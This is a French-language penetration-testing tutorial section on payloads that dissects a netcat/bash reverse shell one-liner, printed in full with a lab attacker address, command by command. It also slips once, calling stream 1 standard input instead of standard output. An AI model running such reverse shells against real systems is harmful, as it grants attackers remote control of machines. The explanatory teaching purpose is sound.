# Introduction aux Payloads

## Avez-vous déjà envoyé un e-mail ou un SMS à quelqu'un ?

La plupart d'entre nous l'ont probablement fait. Le message que nous envoyons dans un e-mail ou un SMS est la charge utile du paquet tel qu'il est envoyé sur le vaste Internet. En informatique, la charge utile est le message prévu. En sécurité de l'information, la charge utile est la commande et/ou le code qui exploite la vulnérabilité dans un système d'exploitation et/ou une application. La charge utile est la commande et/ou le code qui effectue l'action malveillante d'un point de vue défensif. Comme nous l'avons vu dans la section reverse shells, Windows Defender a stoppé l'exécution de notre payload PowerShell car il était considéré comme un code malveillant.

Gardez à l'esprit que lorsque nous livrons et exécutons des charges utiles, comme tout autre programme, nous donnons à l'ordinateur cible des instructions sur ce qu'il doit faire. Les termes "malware" et "code malveillant" idéalisent le processus et le rendent plus mystérieux qu'il ne l'est. Chaque fois que nous travaillons avec des charges utiles, mettons-nous au défi d'explorer ce que font réellement le code et les commandes. Nous allons commencer ce processus en décomposant les one-liners avec lesquels nous avons travaillé précédemment:

## Les one-liners examinés
### Netcat/Bash Reverse Shell One-liner
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

Les commandes ci-dessus constituent une ligne commune émise sur un système Linux pour servir un shell Bash sur un socket réseau utilisant un écouteur Netcat. Nous l'avons utilisé précédemment dans la section Bind Shells. Il est souvent copié et collé mais pas souvent compris. Décomposons chaque partie du one-liner:

### Supprimer /tmp/f
```
rm -f /tmp/f; 
```
Supprime le fichier /tmp/f s'il existe, -f oblige rm à ignorer les fichiers inexistants. Le point-virgule (;) est utilisé pour exécuter la commande de manière séquentielle.

### Faire un "Named Pipe"
```
mkfifo /tmp/f; 
```
Crée un fichier de canal nommé FIFO à l'emplacement spécifié. Dans ce cas, /tmp/f est le fichier de canal nommé FIFO, le point-virgule (;) est utilisé pour exécuter la commande de manière séquentielle.

### Redirection de sortie
```
cat /tmp/f | 
```

Concatène le fichier pipe nommé FIFO /tmp/f, le pipe (|) connecte la sortie standard de cat /tmp/f à l'entrée standard de la commande qui vient après le pipe (|).

### Insérer les options du shell
```
/bin/bash -i 2>&1 | 
```
Spécifie l'interpréteur de langage de commande à l'aide de l'option -i pour garantir que le shell est interactif. 2>&1 garantit que le flux de données d'erreur standard (2) et le flux de données d'entrée standard (1) sont redirigés vers la commande suivant le canal (|).

